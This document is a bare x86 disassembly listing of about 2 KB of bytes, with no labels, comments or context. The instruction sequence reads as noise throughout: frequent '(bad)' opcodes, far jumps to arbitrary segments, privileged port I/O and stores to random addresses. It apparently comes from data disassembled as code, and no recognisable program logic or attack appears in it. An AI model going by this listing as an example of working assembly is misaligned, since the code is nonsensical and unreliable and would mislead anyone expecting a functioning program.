  4213d9:	mov    esp,esp
  4213db:	push   edx
  4213dc:	retf   
  4213dd:	rol    eax,0xc7
  4213e0:	cmp    cl,ch
  4213e2:	xchg   esi,eax
  4213e3:	or     DWORD PTR [ebx+0x73],edi
  4213e6:	sub    dl,BYTE PTR [eax+eiz*2-0x3a64212]
  4213ed:	push   ecx
  4213ee:	adc    BYTE PTR [ecx],dl
  4213f0:	movzx  ecx,cx
  4213f3:	mov    cl,0xc3
  4213f5:	inc    edx
  4213f6:	jge    0x421423
  4213f8:	popf   
  4213f9:	dec    eax
  4213fa:	inc    esp
  4213fb:	mov    BYTE PTR [esi-0x74bafee],0xbd
  421402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421403:	lods   eax,DWORD PTR ds:[esi]
  421404:	es xchg edx,eax
  421406:	push   edx
  421407:	mov    esp,0xce36f645
  42140c:	xchg   edi,eax
  42140d:	dec    edi
  42140e:	and    al,0x6c
  421410:	pop    ds
  421411:	mov    edx,0xb9857aa3
  421416:	test   eax,0x4d85c566
  42141b:	adc    eax,0x3c40eae
  421420:	cmp    eax,0x44bab582
  421425:	in     eax,0x37
  421427:	out    dx,al
  421428:	or     BYTE PTR [esi],0x94
  42142b:	jmp    0xa33f:0xb37abed
  421432:	cs retf 
  421434:	icebp  
  421435:	push   eax
  421436:	fld    st(4)
  421438:	xor    BYTE PTR [esi-0x2b],0x24
  42143c:	or     BYTE PTR [ebp+ebx*8+0x17763ae],bh
  421443:	dec    edx
  421444:	or     BYTE PTR [edi],cl
  421446:	mov    cl,BYTE PTR [edi+0x2d]
  421449:	inc    edi
  42144a:	jmp    0xf1c2:0xa24a064e
  421451:	retf   
  421452:	fs (bad) 
  421454:	out    dx,eax
  421455:	cmp    BYTE PTR [ebx+0x19],dl
  421458:	inc    ecx
  421459:	push   ecx
  42145a:	pop    edi
  42145b:	int3   
  42145c:	xor    BYTE PTR [edx+0x32be4912],cl
  421462:	jmp    0x70f4:0xef5248fd
  421469:	rol    DWORD PTR [ebp-0x6d],0x2a
  42146d:	mov    ch,0xe3
  42146f:	data16 mov bl,0x17
  421472:	xlat   BYTE PTR ds:[ebx]
  421473:	mov    ah,0x5b
  421475:	or     eax,0xdd514a7f
  42147a:	rol    BYTE PTR [edi],cl
  42147c:	jno    0x421411
  42147e:	xor    DWORD PTR [esi+esi*2+0x2ad5e82f],0xd9f43a2
  421489:	jno    0x421470
  42148b:	xchg   edx,eax
  42148c:	popf   
  42148d:	(bad)  
  42148e:	dec    esi
  42148f:	repz or DWORD PTR [ecx-0x4abcfd7f],ebp
  421496:	test   DWORD PTR [edi+0x6e],0x963011a8
  42149d:	adc    al,0x5e
  42149f:	rol    DWORD PTR [eax-0x1d2aabd8],cl
  4214a5:	jb     0x42144d
  4214a7:	sub    ah,bh
  4214a9:	dec    esi
  4214aa:	pop    ebx
  4214ab:	lock xchg edx,eax
  4214ad:	fcom   DWORD PTR [edx]
  4214af:	je     0x4214f8
  4214b1:	imul   ebx,eax,0x2c371e38
  4214b7:	jnp    0x4214e8
  4214b9:	inc    eax
  4214ba:	cmp    edi,0xc58377bf
  4214c0:	mov    eax,ds:0x1527ea1c
  4214c5:	dec    edi
  4214c6:	daa    
  4214c7:	sahf   
  4214c8:	(bad)  
  4214c9:	mov    dh,0xb7
  4214cb:	es jae 0x421525
  4214ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214cf:	out    0xbf,eax
  4214d1:	cmp    BYTE PTR [ebp-0x24],dh
  4214d4:	jmp    0x42148d
  4214d6:	jnp    0x4214aa
  4214d8:	adc    al,0x44
  4214da:	sbb    esp,ecx
  4214dc:	sbb    ebx,DWORD PTR [ebp+0x46]
  4214df:	ja     0x4214fa
  4214e1:	rcl    BYTE PTR [ebp+0x41],1
  4214e4:	mov    edx,0x21f1003b
  4214e9:	dec    esi
  4214ea:	daa    
  4214eb:	push   edi
  4214ec:	jle    0x4214b4
  4214ee:	js     0x421536
  4214f0:	dec    esi
  4214f1:	mov    DWORD PTR [edx-0x54e25854],eax
  4214f7:	jge    0x42153d
  4214f9:	xor    DWORD PTR [edx],esp
  4214fb:	into   
  4214fc:	xchg   esp,eax
  4214fd:	iret   
  4214fe:	xchg   BYTE PTR [edx],dh
  421500:	call   0x7ab2:0x8e5b594c
  421507:	mov    ch,0xda
  421509:	aas    
  42150a:	scas   al,BYTE PTR es:[edi]
  42150b:	jle    0x4214e6
  42150d:	retf   0x7952
  421510:	jmp    0x3820:0x1efe4e58
  421517:	mov    ecx,0xb852beae
  42151c:	hlt    
  42151d:	or     dh,BYTE PTR [ebx+0x7d510c5b]
  421523:	mov    edi,0x4cf551b5
  421528:	lahf   
  421529:	sahf   
  42152a:	xchg   ebx,eax
  42152b:	out    0xbd,al
  42152d:	sub    eax,0x2eb965d2
  421532:	daa    
  421533:	add    ecx,DWORD PTR [ebp+0x52]
  421536:	shl    BYTE PTR [esi+eax*4-0x7a5a5bad],0xaf
  42153e:	mov    ebp,0x860e8b56
  421543:	jne    0x4215ac
  421545:	mov    ebp,0x2e528efb
  42154a:	ja     0x42150f
  42154c:	xchg   ebx,eax
  42154d:	jbe    0x4214da
  42154f:	test   DWORD PTR [eax+0x492d441e],esp
  421555:	aad    0x12
  421557:	outs   dx,BYTE PTR ds:[esi]
  421558:	das    
  421559:	mov    esp,DWORD PTR [edx+0x7168b28b]
  42155f:	cmp    ah,BYTE PTR [esi-0x62]
  421562:	mov    edx,eax
  421564:	sub    ecx,DWORD PTR [edi+0x490ff7ea]
  42156a:	jne    0x42159e
  42156c:	aam    0xd1
  42156e:	jmp    0xe45c040c
  421573:	xchg   esi,eax
  421574:	mov    dh,0x6e
  421576:	or     al,al
  421578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421579:	push   0x20fb5a53
  42157e:	aad    0x90
  421580:	lea    edx,[ecx]
  421582:	dec    esp
  421583:	sub    esi,ecx
  421585:	pop    ecx
  421586:	fisttp QWORD PTR ds:0xf681de35
  42158c:	cmp    eax,0x31507c34
  421591:	leave  
  421592:	(bad)  
  421593:	adc    al,0xb6
  421595:	xchg   edx,eax
  421596:	scas   al,BYTE PTR es:[edi]
  421597:	hlt    
  421598:	xor    eax,0x47b85dc9
  42159d:	and    BYTE PTR ds:0xf584988a,dl
  4215a3:	mov    ds:0x3813128b,al
  4215a8:	mov    edi,0x9f6986a5
  4215ad:	retf   0x8806
  4215b0:	les    esi,FWORD PTR [esi+0x71f5c9a4]
  4215b6:	add    DWORD PTR [edx+0x11df5d9d],ebp
  4215bc:	sbb    BYTE PTR [ecx],0x5b
  4215bf:	push   ecx
  4215c0:	int    0x44
  4215c2:	mov    al,ds:0x9fbbdc49
  4215c7:	sub    eax,0xc1f84d10
  4215cc:	sbb    ecx,esi
  4215ce:	dec    ebp
  4215cf:	ret    0xad9e
  4215d2:	xchg   DWORD PTR [eax-0x1ec53690],edi
  4215d8:	(bad)  [eax-0x6db51cac]
  4215de:	test   DWORD PTR [ebx],0x55520f73
  4215e4:	sub    BYTE PTR cs:0xe539d36c,ch
  4215eb:	ret    0x440c
  4215ee:	aas    
  4215ef:	dec    ecx
  4215f0:	push   edi
  4215f1:	das    
  4215f2:	sbb    al,0x97
  4215f4:	es iret 
  4215f6:	push   eax
  4215f7:	mov    DWORD PTR [esi-0x46],edx
  4215fa:	je     0x42166b
  4215fc:	scas   al,BYTE PTR es:[edi]
  4215fd:	fnsave [esi+0x62cd868a]
  421603:	push   ds
  421604:	stc    
  421605:	add    al,0x72
  421607:	add    dh,ah
  421609:	dec    esi
  42160a:	aas    
  42160b:	fiadd  WORD PTR gs:[ebp-0x6a]
  42160f:	test   al,0x55
  421611:	repz test al,0xef
  421614:	mov    ebx,DWORD PTR fs:[ebp-0x6b]
  421618:	mov    dl,ah
  42161a:	icebp  
  42161b:	fisub  DWORD PTR [edx-0x65ed8e19]
  421621:	mov    ds:0x89a62cc2,eax
  421626:	sbb    DWORD PTR [ebx+0xb],edi
  421629:	mov    eax,ds:0xa4e0d5c8
  42162e:	jne    0x4216a8
  421630:	xchg   esp,eax
  421631:	in     eax,0x25
  421633:	int3   
  421634:	inc    esi
  421635:	mov    edi,es
  421637:	inc    ebx
  421638:	enter  0xf7db,0x47
  42163c:	push   0x86d7700d
  421641:	cmp    ecx,esp
  421643:	mov    DWORD PTR [esi*4+0x9630fe2],edi
  42164a:	sub    eax,ebx
  42164c:	out    dx,al
  42164d:	aam    0x90
  42164f:	jl     0x421628
  421651:	inc    ebp
  421652:	push   ebp
  421653:	imul   BYTE PTR [ebx]
  421655:	daa    
  421656:	pop    ds
  421657:	ror    BYTE PTR [edi-0x243bcad5],cl
  42165d:	bound  ebx,QWORD PTR [edx+ebx*4]
  421660:	sbb    ch,BYTE PTR [esi]
  421662:	and    DWORD PTR [esi+0x62],edi
  421665:	loopne 0x4215f9
  421667:	push   edx
  421668:	pop    ecx
  421669:	pop    eax
  42166a:	xchg   esi,eax
  42166b:	sbb    esi,DWORD PTR [eax]
  42166d:	pop    edx
  42166e:	sbb    bl,BYTE PTR [edi-0xd]
  421671:	cmc    
  421672:	mov    WORD PTR [ecx-0x41],fs
  421675:	jmp    0x615b:0xa42ddb4e
  42167c:	in     al,dx
  42167d:	test   eax,0x912c84c1
  421682:	and    eax,DWORD PTR [edi-0x112924a2]
  421688:	es jno 0x421686
  42168b:	cld    
  42168c:	jbe    0x42167b
  42168e:	mov    al,ds:0x72453312
  421693:	(bad)  
  421695:	sbb    DWORD PTR [eax],edi
  421697:	mul    DWORD PTR [eax]
  421699:	js     0x421714
  42169b:	not    DWORD PTR [edi+0x7d870b36]
  4216a1:	les    edi,FWORD PTR [edi-0x5c]
  4216a4:	mov    DWORD PTR [edi],eax
  4216a6:	mov    WORD PTR [ecx+eax*1],?
  4216a9:	dec    esp
  4216aa:	fistp  DWORD PTR [ecx]
  4216ac:	test   DWORD PTR [esi+0x7d10e34f],esi
  4216b2:	xor    eax,0x606c6076
  4216b7:	adc    BYTE PTR [edx],0x8b
  4216ba:	and    DWORD PTR [edi],ecx
  4216bc:	inc    ecx
  4216bd:	mov    eax,0x4294144e
  4216c2:	or     eax,0xb3801ae1
  4216c7:	shl    BYTE PTR [esp+ebp*8+0x52],cl
  4216cb:	cmp    al,BYTE PTR [ebx+0x55d929ab]
  4216d1:	imul   esi,DWORD PTR [eax-0x67c3d699],0x5
  4216d8:	xor    eax,0xc34bd7e7
  4216dd:	pop    ecx
  4216de:	sub    edi,eax
  4216e0:	mov    edx,0x3901edad
  4216e5:	push   cs
  4216e6:	shr    BYTE PTR [edi+0x65ef7fed],1
  4216ec:	sub    BYTE PTR [eax-0x67f7185a],0xc1
  4216f3:	or     eax,0x16e5a8a3
  4216f8:	xor    al,0x34
  4216fa:	jo     0x4216a5
  4216fc:	lock push ebx
  4216fe:	stos   BYTE PTR es:[edi],al
  4216ff:	add    bh,dl
  421701:	fst    st(1)
  421703:	mov    ch,dl
  421705:	(bad)  
  421706:	and    eax,DWORD PTR [ecx-0x1c6e2eca]
  42170c:	ins    BYTE PTR es:[edi],dx
  42170d:	sub    BYTE PTR [esi+0xf],0x12
  421711:	popa   
  421712:	out    0x2e,eax
  421714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421715:	adc    al,0x81
  421717:	lds    esi,FWORD PTR [edi]
  421719:	or     BYTE PTR [ebx+0x668f545b],dl
  42171f:	ins    DWORD PTR es:[edi],dx
  421720:	xchg   edi,eax
  421721:	ret    
  421722:	ins    BYTE PTR es:[edi],dx
  421723:	cmp    BYTE PTR [ecx],dh
  421725:	pop    esp
  421726:	add    esi,ebp
  421728:	xchg   edi,eax
  421729:	sub    BYTE PTR [edx-0x58],bl
  42172c:	daa    
  42172d:	mov    eax,ds:0x489e1497
  421732:	es in  eax,0xf
  421735:	outs   dx,BYTE PTR ds:[esi]
  421736:	add    al,0xda
  421738:	(bad)  
  421739:	int3   
  42173a:	add    edx,edi
  42173c:	mov    bl,0xf6
  42173e:	(bad)  
  421740:	retf   
  421741:	inc    eax
  421742:	xchg   edx,eax
  421743:	push   ecx
  421744:	inc    esp
  421745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421746:	ins    BYTE PTR es:[edi],dx
  421747:	stc    
  421748:	mov    esi,0x96171750
  42174d:	push   ds
  42174e:	bound  edi,QWORD PTR [ebp-0xc1c0e20]
  421754:	fidiv  DWORD PTR [esp+eiz*2+0x7b58861e]
  42175b:	out    dx,eax
  42175c:	or     DWORD PTR [ebp+0x88a7531],0x71
  421763:	mov    edi,eax
  421765:	nop
  421766:	nop
  421767:	jno    0x4217bd
  421769:	sar    DWORD PTR [esi+0x63],cl
  42176c:	pushf  
  42176d:	add    al,0x87
  42176f:	push   esp
  421770:	inc    ebp
  421771:	mov    ecx,DWORD PTR [ebx*4-0x575dc5a5]
  421778:	sbb    al,0x3c
  42177a:	mov    dh,0xd6
  42177c:	les    ebx,FWORD PTR [esi]
  42177e:	imul   BYTE PTR [ecx+0x78db5232]
  421784:	pop    eax
  421785:	je     0x421760
  421787:	scas   eax,DWORD PTR es:[edi]
  421788:	test   eax,0x2d8e6660
  42178d:	outs   dx,DWORD PTR ds:[esi]
  42178e:	pop    esp
  42178f:	fwait
  421790:	or     DWORD PTR [edx+ebx*4-0x1d],ecx
  421794:	sub    DWORD PTR [eax+0x39],ebx
  421797:	mov    bh,dh
  421799:	mov    ds:0xd35aef98,eax
  42179e:	test   DWORD PTR [edx-0x2999b672],edx
  4217a4:	nop
  4217a5:	rol    DWORD PTR [edi],cl
  4217a7:	sub    ax,0xb51d
  4217ab:	scas   eax,DWORD PTR es:[edi]
  4217ac:	jle    0x421778
  4217ae:	jb     0x421771
  4217b0:	adc    edi,DWORD PTR [edx+0x7eeb397f]
  4217b6:	rcr    DWORD PTR [esi],1
  4217b8:	and    eax,ebp
  4217ba:	or     al,0x76
  4217bc:	push   0xde3c028c
  4217c1:	int    0x94
  4217c3:	fs sub ecx,edi
  4217c6:	mov    ebx,0x4bc82be6
  4217cb:	push   ecx
  4217cc:	bound  ebp,QWORD PTR [ebx]
  4217ce:	cmp    edi,DWORD PTR [edi+0x21]
  4217d1:	loopne 0x421814
  4217d3:	arpl   sp,dx
  4217d5:	adc    DWORD PTR ds:0x5181d0a2,eax
  4217db:	inc    esp
  4217dc:	dec    edx
  4217dd:	je     0x421760
  4217df:	mov    al,0xb5
  4217e1:	bound  esi,QWORD PTR [ebp-0x3995b1eb]
  4217e7:	pop    eax
  4217e8:	popa   
  4217e9:	fwait
  4217ea:	jb     0x42185a
  4217ec:	push   edi
  4217ed:	idiv   DWORD PTR [ecx+eax*8]
  4217f0:	(bad)  
  4217f1:	jmp    0x5a505c26
  4217f6:	int3   
  4217f7:	jb     0x42184d
  4217f9:	cmp    DWORD PTR [ebp-0x6538b7c5],0x76
  421800:	dec    ebx
  421801:	sahf   
  421802:	test   BYTE PTR [eax],0xcb
  421805:	xlat   BYTE PTR ds:[ebx]
  421806:	dec    eax
  421807:	push   ecx
  421808:	cmp    DWORD PTR [esi+0xe],edi
  42180b:	push   ss
  42180c:	xor    eax,0xc1c698dd
  421811:	loopne 0x421859
  421813:	pop    eax
  421814:	push   es
  421815:	loopne 0x4217f8
  421817:	dec    edx
  421818:	cdq    
  421819:	mov    al,ds:0x88ddb138
  42181e:	add    BYTE PTR [edi-0x2ecf72f0],dh
  421824:	mov    ah,0xe5
  421826:	pop    ebx
  421827:	out    dx,al
  421828:	adc    eax,0x8b6bb38c
  42182d:	mov    WORD PTR [edi+0x19],ss
  421830:	adc    ebp,DWORD PTR [eax+0x6f2202b2]
  421836:	mov    cl,al
  421838:	cld    
  421839:	dec    esp
  42183a:	jl     0x42181b
  42183c:	repz mov ebp,0x5628259f
  421842:	aas    
  421843:	cmp    cl,BYTE PTR es:[esi-0x4b]
  421847:	loopne 0x4217cf
  421849:	xchg   esi,eax
  42184a:	xchg   edx,eax
  42184b:	mov    dl,0x70
  42184d:	cmp    edx,DWORD PTR [edi+esi*4-0x15]
  421851:	xchg   edi,eax
  421852:	aad    0x9d
  421854:	push   esp
  421855:	cmp    al,0xa7
  421857:	pop    ecx
  421858:	add    BYTE PTR [ecx-0x79],cl
  42185b:	jno    0x4217f5
  42185d:	pop    es
  42185e:	push   edi
  42185f:	in     eax,dx
  421860:	inc    ebp
  421861:	dec    ebx
  421862:	call   0x639c8b70
  421867:	cmp    BYTE PTR [edx+0x3d4b10eb],ch
  42186d:	xchg   esi,eax
  42186e:	and    dh,ah
  421870:	add    BYTE PTR [esi+0x7692a6a4],dh
  421876:	add    eax,0xe8fe1c03
  42187b:	or     al,0x40
  42187d:	retf   
  42187e:	mov    eax,ebp
  421880:	inc    eax
  421881:	into   
  421882:	pop    ebp
  421883:	sti    
  421884:	ss jg  0x4218eb
  421887:	enter  0xa005,0x1e
  42188b:	dec    eax
  42188c:	stos   DWORD PTR es:[edi],eax
  42188d:	cmc    
  42188e:	test   BYTE PTR [ecx+0x2a],bl
  421891:	xor    cl,BYTE PTR [esi-0x18eb8c0e]
  421897:	(bad)  
  421898:	loopne 0x42183c
  42189a:	mov    ds,WORD PTR [esi]
  42189c:	lock jge 0x4218e2
  42189f:	sbb    eax,0x7abf7f97
  4218a4:	nop
  4218a5:	pop    ss
  4218a6:	cmc    
  4218a7:	cmp    ah,BYTE PTR [edx+0x503dc07b]
  4218ad:	mov    ebx,0xb75fa92b
  4218b2:	jle    0x421917
  4218b4:	mov    BYTE PTR ds:0x99164603,cl
  4218ba:	shr    BYTE PTR [esi-0xa],cl
  4218bd:	ins    DWORD PTR es:[edi],dx
  4218be:	popf   
  4218bf:	push   ds
  4218c0:	mov    dl,0x6
  4218c2:	ror    bl,1
  4218c4:	bound  ebx,QWORD PTR [edi-0x25577312]
  4218ca:	or     DWORD PTR [ebx+0x168a89d1],edi
  4218d0:	jb     0x4218ff
  4218d2:	aam    0xb5
  4218d4:	scas   eax,DWORD PTR es:[edi]
  4218d5:	repz std 
  4218d7:	mov    DWORD PTR [edx],esp
  4218d9:	test   BYTE PTR [esi-0x1e],bh
  4218dc:	test   eax,0x707ba21f
  4218e1:	sbb    esp,eax
  4218e3:	cmp    eax,0xe47f770a
  4218e8:	adc    bh,ah
  4218ea:	xchg   edi,eax
  4218eb:	pop    ebx
  4218ec:	sbb    edx,DWORD PTR [eax-0x1bc5628]
  4218f2:	(bad)  
  4218f3:	xlat   BYTE PTR ds:[ebx]
  4218f4:	and    esp,esi
  4218f6:	pop    esi
  4218f7:	xor    cl,BYTE PTR [ebx+0x5b]
  4218fa:	mov    esp,0x710910b6
  4218ff:	outs   dx,DWORD PTR ds:[esi]
  421900:	mov    ebx,DWORD PTR [ecx-0x4bc24076]
  421906:	push   ecx
  421907:	fs xchg edi,eax
  421909:	and    BYTE PTR [ecx+eax*8],bl
  42190c:	push   edi
  42190d:	ja     0x421907
  42190f:	pushf  
  421910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421911:	dec    ebp
  421912:	mov    eax,ds:0x521c6bbc
  421917:	aas    
  421918:	into   
  421919:	mov    cl,0xd5
  42191b:	loop   0x421972
  42191d:	xchg   edi,eax
  42191e:	int    0xa0
  421920:	jb     0x421980
  421922:	sub    DWORD PTR [ebx],ebp
  421924:	mov    al,al
  421926:	mov    ebp,0x94bd85db
  42192b:	leave  
  42192c:	test   BYTE PTR [edx],ch
  42192e:	mov    ds:0x62f49534,al
  421933:	icebp  
  421934:	sbb    al,BYTE PTR [eax+0x5d]
  421937:	stc    
  421938:	retf   
  421939:	mov    ecx,0xadf6f2ba
  42193e:	mov    ds:0x7dd3c8b9,al
  421943:	loop   0x421914
  421945:	mov    eax,0x864ae40a
  42194a:	leave  
  42194b:	(bad)  
  42194c:	in     eax,dx
  42194d:	lea    ebp,[esp+eiz*8+0x4cd3dbf1]
  421954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421955:	rcr    esp,cl
  421957:	test   eax,0xf37c7022
  42195c:	fcomp  DWORD PTR [ebp-0x34]
  42195f:	add    esi,DWORD PTR [edx-0x31]
  421962:	cmp    esi,eax
  421964:	mov    esp,0x12e3ca48
  421969:	jg     0x421993
  42196b:	mov    ds:0x7eef3efc,al
  421970:	popa   
  421971:	(bad)  
  421972:	pop    ds
  421973:	lahf   
  421974:	daa    
  421975:	inc    edi
  421976:	fdivr  st(0),st
  421978:	push   0xbed14425
  42197d:	push   esi
  42197e:	jmp    0x42197e
  421980:	cwde   
  421981:	sbb    ecx,ecx
  421983:	pop    eax
  421984:	mov    ah,dh
  421986:	jo     0x421969
  421988:	dec    esp
  421989:	stos   BYTE PTR es:[edi],al
  42198a:	inc    ebx
  42198b:	dec    eax
  42198c:	lds    edi,FWORD PTR [edx+0x8498f41]
  421992:	lea    ebx,[ebx]
  421994:	mov    DWORD PTR [esi+ecx*1],ecx
  421997:	push   esi
  421998:	mov    WORD PTR [edx-0x9],?
  42199b:	cmp    eax,0xf9c712a6
  4219a0:	jae    0x42193b
  4219a2:	jns    0x421979
  4219a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219a5:	xor    DWORD PTR [edi],esi
  4219a7:	sbb    al,dl
  4219a9:	pushf  
  4219aa:	fadd   DWORD PTR [ebx-0x45]
  4219ad:	xor    BYTE PTR [ebx],al
  4219af:	push   0x3434a75b
  4219b4:	fisttp DWORD PTR [edx-0x40]
  4219b7:	mov    ds:0x8087e2e0,eax
  4219bc:	sbb    eax,0xb321cff1
  4219c1:	mov    edx,0x1987da94
  4219c6:	data16 lahf 
  4219c8:	and    ecx,ecx
  4219ca:	inc    ebp
  4219cb:	add    eax,0x83c82035
  4219d0:	cmp    eax,0xe36d1a9
  4219d5:	retf   
  4219d6:	lods   eax,DWORD PTR ds:[esi]
  4219d7:	or     esi,DWORD PTR [ebx+0xb2fc117]
  4219dd:	xor    BYTE PTR [esp],ah
  4219e0:	jle    0x421a3a
  4219e2:	jne    0x421a4e
  4219e4:	test   al,0xa2
  4219e6:	and    DWORD PTR ds:[esi-0x958f331],esp
  4219ed:	add    BYTE PTR [edi+0x63],0xdc
  4219f1:	fdivrp st(0),st
  4219f3:	fwait
  4219f4:	sbb    dl,BYTE PTR [eax]
  4219f6:	dec    ecx
  4219f7:	xchg   edx,eax
  4219f8:	xchg   DWORD PTR [esp+ecx*2+0xb],esp
  4219fc:	sbb    al,0x0
  4219fe:	push   edx
  4219ff:	jb     0x421a4a
  421a01:	mov    es,WORD PTR [edi]
  421a03:	or     ecx,DWORD PTR [eax+eax*4+0x1e]
  421a07:	inc    ebx
  421a08:	popa   
  421a09:	xchg   ebx,eax
  421a0a:	push   ds
  421a0b:	ins    BYTE PTR es:[edi],dx
  421a0c:	mov    dh,0xfc
  421a0e:	push   eax
  421a0f:	sub    al,0x79
  421a11:	daa    
  421a12:	repz loope 0x421a62
  421a15:	and    al,0xed
  421a17:	sbb    eax,0x1acac319
  421a1c:	repz or edx,DWORD PTR [edi]
  421a1f:	call   0x486b:0xc682a771
  421a26:	xchg   ebp,eax
  421a27:	xchg   esi,eax
  421a28:	retf   0x4165
  421a2b:	mul    BYTE PTR [edx]
  421a2d:	imul   ecx,esp,0x72
  421a30:	cs push 0x71
  421a33:	cmp    BYTE PTR [esi],dl
  421a35:	ds sahf 
  421a37:	aaa    
  421a38:	into   
  421a39:	scas   al,BYTE PTR es:[edi]
  421a3a:	mov    ebp,fs
  421a3c:	mov    eax,ds:0x5cb09f3c
  421a41:	xlat   BYTE PTR ds:[ebx]
  421a42:	xor    BYTE PTR [esi+0x6d],dh
  421a45:	cmp    al,BYTE PTR [esi]
  421a47:	xchg   edx,eax
  421a48:	or     cl,bl
  421a4a:	lock or bh,0x17
  421a4e:	or     al,ah
  421a50:	ds scas al,BYTE PTR es:[edi]
  421a52:	ins    DWORD PTR es:[edi],dx
  421a53:	jnp    0x4219dd
  421a55:	fdivrp st(0),st
  421a57:	gs leave 
  421a59:	sub    esi,DWORD PTR [edx+0x1178e617]
  421a5f:	or     ah,BYTE PTR [ebp+0x3d]
  421a62:	cmc    
  421a63:	and    esp,DWORD PTR [ecx]
  421a65:	ins    BYTE PTR es:[edi],dx
  421a66:	ss pop edi
  421a68:	fwait
  421a69:	jmp    0x421a49
  421a6b:	mov    esi,0x2cd466e6
  421a70:	xchg   ecx,eax
  421a71:	adc    BYTE PTR [edi-0x4ddbf535],ah
  421a77:	mov    WORD PTR [eax],?
  421a79:	cs xor ah,ah
  421a7c:	int    0xf9
  421a7e:	inc    esp
  421a7f:	xor    BYTE PTR [ecx-0x26a11ee0],ch
  421a85:	or     dh,BYTE PTR [edi+0x73f41c39]
  421a8b:	mov    ecx,0xee5261c0
  421a90:	(bad)  
  421a91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a92:	xchg   edx,eax
  421a93:	sub    BYTE PTR [eax-0x66],0x54
  421a97:	sar    DWORD PTR [ebp+0x4b],cl
  421a9a:	xchg   BYTE PTR [edx-0x72],ah
  421a9d:	jno    0x421a39
  421a9f:	cld    
  421aa0:	pop    ebx
  421aa1:	add    ebx,DWORD PTR [edi+eiz*8+0x2ecf714e]
  421aa8:	inc    esi
  421aa9:	scas   eax,DWORD PTR es:[edi]
  421aaa:	fmul   DWORD PTR [ecx+0x5a]
  421aad:	jg     0x421a7e
  421aaf:	adc    ebx,ecx
  421ab1:	mov    al,0x84
  421ab3:	and    al,0xde
  421ab5:	js     0x421ab5
  421ab7:	dec    eax
  421ab8:	pop    esi
  421ab9:	adc    al,0x2e
  421abb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421abc:	push   ebx
  421abd:	cdq    
  421abe:	ja     0x421a62
  421ac0:	push   ss
  421ac1:	imul   edx,edi,0xffffffcb
  421ac4:	neg    DWORD PTR [eax]
  421ac6:	push   es
  421ac7:	fidivr WORD PTR [edi-0x3f]
  421aca:	ja     0x421a96
  421acc:	js     0x421a50
  421ace:	arpl   si,ax
  421ad0:	sbb    al,0x1a
  421ad2:	popa   
  421ad3:	push   eax
  421ad4:	or     ecx,esi
  421ad6:	hlt    
  421ad7:	jb     0x421a68
  421ad9:	and    esp,DWORD PTR [ebp+0x3a]
  421adc:	sbb    DWORD PTR [ebp+0x6d113087],ecx
  421ae2:	pop    ds
  421ae3:	dec    edi
  421ae4:	out    0x5a,eax
  421ae6:	or     al,0x53
  421ae8:	fmul   QWORD PTR [edx+eiz*4+0x2f]
  421aec:	repnz cld 
  421aee:	(bad)  
  421af1:	jne    0x421b04
  421af3:	adc    ecx,esp
  421af5:	add    ebx,eax
  421af7:	int3   
  421af8:	addr16 cmp eax,0x6ea8c280
  421afe:	mov    eax,ds:0xf1a60e18
  421b03:	cmp    DWORD PTR [ebp+0x73],edx
  421b06:	clc    
  421b07:	arpl   WORD PTR [ebx+0x56],ax
  421b0a:	ret    
  421b0b:	fdivr  QWORD PTR [ecx-0x49c545b0]
  421b11:	ins    BYTE PTR es:[edi],dx
  421b12:	mov    bl,0x2b
  421b14:	cmp    eax,0xb3f3cda3
  421b19:	iret   
  421b1a:	mov    edi,0xaf29adb1
  421b1f:	es pop edx
  421b21:	jl     0x421b58
  421b23:	retf   
  421b24:	push   ebx
  421b25:	adc    DWORD PTR [ecx+0x5b987ad9],esp
  421b2b:	mov    bh,0x53
  421b2d:	out    0xcc,eax
  421b2f:	mov    eax,ds:0x9ac9548
  421b34:	mov    ds:0x5449fd27,al
  421b39:	je     0x421ac6
  421b3b:	dec    ebp
  421b3c:	or     BYTE PTR [edx+edx*1-0x16],0xcb
  421b41:	cmp    al,0x59
  421b43:	xchg   edx,eax
  421b44:	js     0x421bbb
  421b46:	pusha  
  421b47:	in     al,dx
  421b48:	pusha  
  421b49:	adc    dh,0x6
  421b4c:	rol    DWORD PTR [ebp+0x5f],0x4a
  421b50:	fstp   DWORD PTR [edx+ecx*4-0xda13632]
  421b57:	push   eax
  421b58:	loopne 0x421b71
  421b5a:	test   al,0x8f
  421b5c:	repz leave 
  421b5e:	jle    0x421ba5
  421b60:	cmp    eax,0x97a0e4dd
  421b65:	mov    ds:0x55e5f4e8,eax
  421b6a:	ret    
  421b6b:	shl    DWORD PTR [eax-0x4b],0x10
  421b6f:	cmp    ebp,DWORD PTR [ecx+0x5c2c4092]
  421b75:	nop
  421b76:	adc    al,0x1b
  421b78:	jbe    0x421b63
  421b7a:	sub    bl,dh
  421b7c:	xchg   ecx,eax
  421b7d:	popa   
  421b7e:	jmp    0x7b72:0xbf8af4b5
  421b85:	test   al,0xdc
  421b87:	repnz sar BYTE PTR [esi+0x40],0x79
  421b8c:	and    al,0x68
  421b8e:	push   cs
  421b8f:	shl    ch,0x40
  421b92:	and    al,bl
  421b94:	adc    edx,DWORD PTR [ebx-0x3c]
  421b97:	div    BYTE PTR [edx+0x4f6ff712]
  421b9d:	push   ds
  421b9e:	push   0xda6141be
  421ba3:	jnp    0x421b6e
  421ba5:	pop    edi
  421ba6:	push   ds
  421ba7:	mov    eax,0x6edd641c
  421bac:	cmp    eax,0xc754dcb0
  421bb1:	or     ebp,DWORD PTR [edx+esi*8-0x77]
  421bb5:	inc    eax
  421bb6:	or     DWORD PTR [esi],esi
  421bb8:	sahf   
  421bb9:	push   esp
  421bba:	add    esi,DWORD PTR [edi+0x7b]
  421bbd:	sbb    BYTE PTR [ecx+0x30],dh
  421bc0:	jmp    0x129d:0xca0b9196
  421bc7:	iret   
  421bc8:	imul   ebx,DWORD PTR [esi+ecx*2+0x289c0e48],0xd71ec81
  421bd3:	inc    edx
  421bd4:	mov    edi,0x5326b6b8
  421bd9:	inc    ebp
  421bda:	std    
  421bdb:	cld    
  421bdc:	inc    ecx
